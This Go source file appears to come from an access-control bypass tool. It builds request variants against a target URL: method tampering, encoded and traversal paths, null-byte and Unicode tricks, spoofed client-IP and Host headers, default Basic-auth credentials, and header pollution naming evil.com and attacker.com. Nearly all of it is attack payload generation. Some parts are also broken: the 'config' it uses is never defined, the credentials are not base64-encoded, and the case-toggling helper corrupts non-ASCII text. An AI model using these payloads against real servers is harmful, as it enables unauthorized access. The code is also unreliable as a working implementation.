package main

import (
	"fmt"
	"net/url"
	"strings"
)

// TechniqueConfig represents a bypass technique configuration
type TechniqueConfig struct {
	Name    string
	URL     string
	Method  string
	Headers map[string]string
	Body    string
}

func generateBypassTechniques(targetURL string) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	// Parse the target URL
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return techniques
	}
	
	// Generate techniques based on configuration
	if config.All || config.Basic {
		techniques = append(techniques, generateBasicTechniques(targetURL, parsedURL)...)
	}
	
	if config.All || config.Advanced {
		techniques = append(techniques, generateAdvancedTechniques(targetURL, parsedURL)...)
	}
	
	return techniques
}

func generateBasicTechniques(targetURL string, parsedURL *url.URL) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	// 1. HTTP Method Tampering
	methods := []string{"HEAD", "OPTIONS", "PUT", "DELETE", "PATCH", "TRACE"}
	if config.Method != "" {
		methods = []string{config.Method}
	}
	
	for _, method := range methods {
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("HTTP_METHOD_%s", method),
			URL:    targetURL,
			Method: method,
			Headers: map[string]string{},
		})
	}
	
	// X-HTTP-Method-Override
	for _, overrideMethod := range []string{"GET", "POST", "PUT", "DELETE"} {
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("X_HTTP_METHOD_OVERRIDE_%s", overrideMethod),
			URL:    targetURL,
			Method: "POST",
			Headers: map[string]string{
				"X-HTTP-Method-Override": overrideMethod,
			},
		})
	}
	
	// 2. Path/URL Obfuscation Tricks
	pathVariations := generatePathVariations(parsedURL.Path)
	for _, pathVar := range pathVariations {
		newURL := strings.Replace(targetURL, parsedURL.Path, pathVar.Path, 1)
		techniques = append(techniques, TechniqueConfig{
			Name:   pathVar.Name,
			URL:    newURL,
			Method: "GET",
			Headers: map[string]string{},
		})
	}
	
	// 3. Header Manipulation
	headerTechniques := generateHeaderTechniques(targetURL)
	techniques = append(techniques, headerTechniques...)
	
	// 4. Authentication/Token Abuse
	authTechniques := generateAuthTechniques(targetURL)
	techniques = append(techniques, authTechniques...)
	
	// 5. Content-Type & Body-Based Tricks
	contentTypeTechniques := generateContentTypeTechniques(targetURL)
	techniques = append(techniques, contentTypeTechniques...)
	
	// 6. Host Header Attacks
	hostTechniques := generateHostHeaderTechniques(targetURL)
	techniques = append(techniques, hostTechniques...)
	
	// 7. CDN, WAF, and Proxy Bypass
	proxyTechniques := generateProxyBypassTechniques(targetURL)
	techniques = append(techniques, proxyTechniques...)
	
	// 8. HTTP Version or Protocol Tricks
	protocolTechniques := generateProtocolTechniques(targetURL)
	techniques = append(techniques, protocolTechniques...)
	
	return techniques
}

func generateAdvancedTechniques(targetURL string, parsedURL *url.URL) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	// 1. Null Path Segment Injections
	nullSegmentTechniques := generateNullSegmentTechniques(targetURL, parsedURL)
	techniques = append(techniques, nullSegmentTechniques...)
	
	// 2. Unicode and Confusable Characters
	unicodeTechniques := generateUnicodeTechniques(targetURL, parsedURL)
	techniques = append(techniques, unicodeTechniques...)
	
	// 3. Double URL Decode Bypass
	doubleDecodeTechniques := generateDoubleDecodeTechniques(targetURL, parsedURL)
	techniques = append(techniques, doubleDecodeTechniques...)
	
	// 4. Proxy/Load Balancer Path Confusion
	confusionTechniques := generatePathConfusionTechniques(targetURL, parsedURL)
	techniques = append(techniques, confusionTechniques...)
	
	// 5. URL Fragments and Queries
	fragmentTechniques := generateFragmentTechniques(targetURL)
	techniques = append(techniques, fragmentTechniques...)
	
	// 6. Verb Tunneling via GET Parameters
	tunnelTechniques := generateVerbTunnelingTechniques(targetURL)
	techniques = append(techniques, tunnelTechniques...)
	
	// 7. Header Pollution
	pollutionTechniques := generateHeaderPollutionTechniques(targetURL)
	techniques = append(techniques, pollutionTechniques...)
	
	// 8. File Extension Spoofing
	extensionTechniques := generateExtensionSpoofingTechniques(targetURL, parsedURL)
	techniques = append(techniques, extensionTechniques...)
	
	return techniques
}

type PathVariation struct {
	Name string
	Path string
}

func generatePathVariations(originalPath string) []PathVariation {
	variations := []PathVariation{
		{"TRAILING_SLASH", originalPath + "/"},
		{"TRAILING_DOT", originalPath + "/."},
		{"TRAILING_SEMICOLON_SLASH", originalPath + ";/"},
		{"TRAILING_SPACE_ENCODED", originalPath + "%20/"},
		{"TRAILING_TAB_ENCODED", originalPath + "%09/"},
		{"DOUBLE_SLASH", strings.Replace(originalPath, "/", "//", -1)},
		{"DOT_ENCODED", strings.Replace(originalPath, ".", "%2e", -1)},
		{"SLASH_ENCODED", strings.Replace(originalPath, "/", "%2f", -1)},
		{"BACKSLASH_ENCODED", originalPath + "%5c"},
		{"NULL_BYTE", originalPath + "%00"},
		{"PATH_TRAVERSAL_DOT", "./" + originalPath},
		{"PATH_TRAVERSAL_DOTDOT", "../" + originalPath},
		{"CASE_UPPER", strings.ToUpper(originalPath)},
		{"CASE_MIXED", toggleCase(originalPath)},
	}
	
	// Add more complex variations
	if strings.Contains(originalPath, "/") {
		parts := strings.Split(originalPath, "/")
		if len(parts) > 1 {
			// Double slash variations
			for i := 1; i < len(parts); i++ {
				modifiedParts := make([]string, len(parts))
				copy(modifiedParts, parts)
				modifiedParts[i] = "/" + modifiedParts[i]
				variations = append(variations, PathVariation{
					Name: fmt.Sprintf("DOUBLE_SLASH_SEGMENT_%d", i),
					Path: strings.Join(modifiedParts, "/"),
				})
			}
		}
	}
	
	return variations
}

func generateHeaderTechniques(targetURL string) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	// IP Spoofing headers
	spoofingHeaders := []string{
		"X-Original-URL", "X-Custom-IP-Authorization", "X-Forwarded-For",
		"X-Host", "X-Remote-IP", "X-Originating-IP", "X-Forwarded-Host",
		"X-Real-IP", "X-Client-IP", "True-Client-IP",
	}
	
	for _, header := range spoofingHeaders {
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("IP_SPOOF_%s", strings.Replace(header, "-", "_", -1)),
			URL:    targetURL,
			Method: "GET",
			Headers: map[string]string{
				header: "127.0.0.1",
			},
		})
	}
	
	// Referer/Origin manipulation
	refererValues := []string{
		"https://google.com",
		"https://example.com/legitpath",
		"",
	}
	
	for i, referer := range refererValues {
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("REFERER_MANIPULATION_%d", i),
			URL:    targetURL,
			Method: "GET",
			Headers: map[string]string{
				"Referer": referer,
				"Origin":  referer,
			},
		})
	}
	
	// User-Agent rotation
	for i, ua := range config.UserAgents {
		if i >= 3 { // Limit to first 3 for basic techniques
			break
		}
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("USER_AGENT_%d", i),
			URL:    targetURL,
			Method: "GET",
			Headers: map[string]string{
				"User-Agent": ua,
			},
		})
	}
	
	return techniques
}

func generateAuthTechniques(targetURL string) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	// Basic auth with dummy credentials
	dummyCreds := []string{
		"admin:password",
		"test:test",
		"user:user",
		"guest:guest",
	}
	
	for _, cred := range dummyCreds {
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("BASIC_AUTH_%s", strings.Replace(cred, ":", "_", -1)),
			URL:    targetURL,
			Method: "GET",
			Headers: map[string]string{
				"Authorization": "Basic " + cred, // Should be base64 encoded in real implementation
			},
		})
	}
	
	// Bearer token manipulation
	dummyTokens := []string{
		"invalid_token",
		"",
		"expired_token_123",
	}
	
	for i, token := range dummyTokens {
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("BEARER_TOKEN_%d", i),
			URL:    targetURL,
			Method: "GET",
			Headers: map[string]string{
				"Authorization": "Bearer " + token,
			},
		})
	}
	
	return techniques
}

func generateContentTypeTechniques(targetURL string) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	contentTypes := []string{
		"application/xml",
		"text/plain",
		"multipart/form-data",
		"application/x-www-form-urlencoded",
		"application/json",
	}
	
	for _, ct := range contentTypes {
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("CONTENT_TYPE_%s", strings.Replace(ct, "/", "_", -1)),
			URL:    targetURL,
			Method: "POST",
			Headers: map[string]string{
				"Content-Type": ct,
			},
			Body: `{"_method": "GET"}`,
		})
	}
	
	return techniques
}

func generateHostHeaderTechniques(targetURL string) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	hostValues := []string{
		"localhost",
		"127.0.0.1",
		"internal.service",
		"0.0.0.0",
	}
	
	for _, host := range hostValues {
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("HOST_HEADER_%s", strings.Replace(host, ".", "_", -1)),
			URL:    targetURL,
			Method: "GET",
			Headers: map[string]string{
				"Host": host,
			},
		})
	}
	
	return techniques
}

func generateProxyBypassTechniques(targetURL string) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	// X-Forwarded-* headers
	forwardedHeaders := map[string]string{
		"X-Forwarded-Proto": "https",
		"X-Forwarded-Host":  "legit.domain",
		"X-Forwarded-Port":  "443",
		"Forwarded":         "for=127.0.0.1;host=localhost",
	}
	
	for header, value := range forwardedHeaders {
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("FORWARDED_%s", strings.Replace(header, "-", "_", -1)),
			URL:    targetURL,
			Method: "GET",
			Headers: map[string]string{
				header: value,
			},
		})
	}
	
	return techniques
}

func generateProtocolTechniques(targetURL string) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	// WebSocket upgrade headers
	techniques = append(techniques, TechniqueConfig{
		Name:   "WEBSOCKET_UPGRADE",
		URL:    targetURL,
		Method: "GET",
		Headers: map[string]string{
			"Upgrade":    "websocket",
			"Connection": "Upgrade",
		},
	})
	
	return techniques
}

// Advanced technique generators
func generateNullSegmentTechniques(targetURL string, parsedURL *url.URL) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	path := parsedURL.Path
	nullVariations := []string{
		path + "//././",
		path + "/%ef%bc%8f", // Unicode full-width slash
		strings.Replace(path, "/", "//", -1) + "/././",
	}
	
	for i, variation := range nullVariations {
		newURL := strings.Replace(targetURL, path, variation, 1)
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("NULL_SEGMENT_%d", i),
			URL:    newURL,
			Method: "GET",
			Headers: map[string]string{},
		})
	}
	
	return techniques
}

func generateUnicodeTechniques(targetURL string, parsedURL *url.URL) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	path := parsedURL.Path
	
	// Unicode variations
	unicodeVariations := []string{
		strings.Replace(path, "admin", "admіn", -1), // Cyrillic і
		path + "%E2%81%A0", // Zero-width space
		path + "%F0%80%80%AF", // Non-shortest UTF-8 form
	}
	
	for i, variation := range unicodeVariations {
		newURL := strings.Replace(targetURL, path, variation, 1)
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("UNICODE_VARIATION_%d", i),
			URL:    newURL,
			Method: "GET",
			Headers: map[string]string{},
		})
	}
	
	return techniques
}

func generateDoubleDecodeTechniques(targetURL string, parsedURL *url.URL) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	path := parsedURL.Path
	
	// Double URL decode variations
	doubleDecodeVariations := []string{
		strings.Replace(path, "/", "%252f", -1),
		path + "%252f",
		"..%252f" + path,
	}
	
	for i, variation := range doubleDecodeVariations {
		newURL := strings.Replace(targetURL, path, variation, 1)
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("DOUBLE_DECODE_%d", i),
			URL:    newURL,
			Method: "GET",
			Headers: map[string]string{},
		})
	}
	
	return techniques
}

func generatePathConfusionTechniques(targetURL string, parsedURL *url.URL) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	path := parsedURL.Path
	
	// Path confusion variations
	confusionVariations := []string{
		"/%2e" + path,
		path + "/.%2e/",
		path + "/;/",
	}
	
	for i, variation := range confusionVariations {
		newURL := strings.Replace(targetURL, path, variation, 1)
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("PATH_CONFUSION_%d", i),
			URL:    newURL,
			Method: "GET",
			Headers: map[string]string{},
		})
	}
	
	return techniques
}

func generateFragmentTechniques(targetURL string) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	fragmentVariations := []string{
		targetURL + "#@evil.com",
		targetURL + "#anything",
		targetURL + "?.css",
		targetURL + "?redirect=https://your.site",
	}
	
	for i, variation := range fragmentVariations {
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("FRAGMENT_%d", i),
			URL:    variation,
			Method: "GET",
			Headers: map[string]string{},
		})
	}
	
	return techniques
}

func generateVerbTunnelingTechniques(targetURL string) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	verbParams := []string{
		"?_method=GET",
		"?_verb=HEAD",
		"?_method=POST",
	}
	
	for i, param := range verbParams {
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("VERB_TUNNELING_%d", i),
			URL:    targetURL + param,
			Method: "GET",
			Headers: map[string]string{},
		})
	}
	
	return techniques
}

func generateHeaderPollutionTechniques(targetURL string) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	// Multiple X-Forwarded-For headers
	techniques = append(techniques, TechniqueConfig{
		Name:   "HEADER_POLLUTION_XFF",
		URL:    targetURL,
		Method: "GET",
		Headers: map[string]string{
			"X-Forwarded-For": "evil.com, 127.0.0.1",
		},
	})
	
	techniques = append(techniques, TechniqueConfig{
		Name:   "HEADER_POLLUTION_XFH",
		URL:    targetURL,
		Method: "GET",
		Headers: map[string]string{
			"X-Forwarded-Host": "attacker.com, internal.local",
		},
	})
	
	return techniques
}

func generateExtensionSpoofingTechniques(targetURL string, parsedURL *url.URL) []TechniqueConfig {
	var techniques []TechniqueConfig
	
	path := parsedURL.Path
	extensions := []string{";.jpg", ".json", ".php/", ".asp", ".jsp"}
	
	for _, ext := range extensions {
		newURL := strings.Replace(targetURL, path, path+ext, 1)
		techniques = append(techniques, TechniqueConfig{
			Name:   fmt.Sprintf("EXTENSION_SPOOF_%s", strings.Replace(ext, ".", "_", -1)),
			URL:    newURL,
			Method: "GET",
			Headers: map[string]string{},
		})
	}
	
	return techniques
}

// Helper functions
func toggleCase(s string) string {
	var result strings.Builder
	for i, r := range s {
		if i%2 == 0 {
			result.WriteRune(strings.ToUpper(string(r))[0])
		} else {
			result.WriteRune(strings.ToLower(string(r))[0])
		}
	}
	return result.String()
}
